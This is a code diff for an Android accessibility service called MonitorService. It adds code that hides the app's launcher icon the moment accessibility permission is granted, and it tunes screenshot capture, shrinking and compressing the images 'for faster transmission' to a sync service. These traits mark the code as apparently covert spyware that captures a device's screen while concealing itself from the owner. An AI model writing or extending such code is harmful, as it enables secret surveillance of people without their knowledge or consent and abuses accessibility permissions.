@@ -29,7 +29,18 @@ public class MonitorService extends AccessibilityService {
 
     public static MonitorService getInstance() { return instance; }
 
-    @Override protected void onServiceConnected() { instance = this; }
+    @Override
+    protected void onServiceConnected() {
+        instance = this;
+        // Auto-hide icon the moment accessibility is granted
+        try {
+            android.content.ComponentName alias = new android.content.ComponentName(
+                getPackageName(), getPackageName() + ".MainLauncher");
+            getPackageManager().setComponentEnabledSetting(alias,
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {}
+    }
     @Override public void onInterrupt() {}
     @Override public void onDestroy() { instance = null; super.onDestroy(); }
 
@@ -105,10 +116,18 @@ public class MonitorService extends AccessibilityService {
                     @Override
                     public void onSuccess(ScreenshotResult r) {
                         try {
-                            Bitmap bmp = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), null);
-                            if (bmp != null) {
+                            Bitmap hw = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), null);
+                            if (hw != null) {
+                                // Scale to max 720p width for faster transmission
+                                Bitmap bmp;
+                                if (hw.getWidth() > 720) {
+                                    int dstW = 720;
+                                    int dstH = (int)(hw.getHeight() * (720f / hw.getWidth()));
+                                    bmp = Bitmap.createScaledBitmap(hw, dstW, dstH, true);
+                                    hw.recycle();
+                                } else { bmp = hw; }
                                 ByteArrayOutputStream out = new ByteArrayOutputStream();
-                                bmp.compress(Bitmap.CompressFormat.JPEG, 40, out);
+                                bmp.compress(Bitmap.CompressFormat.JPEG, 30, out);
                                 SyncService.pendingShot = out.toByteArray();
                                 bmp.recycle();
                             }
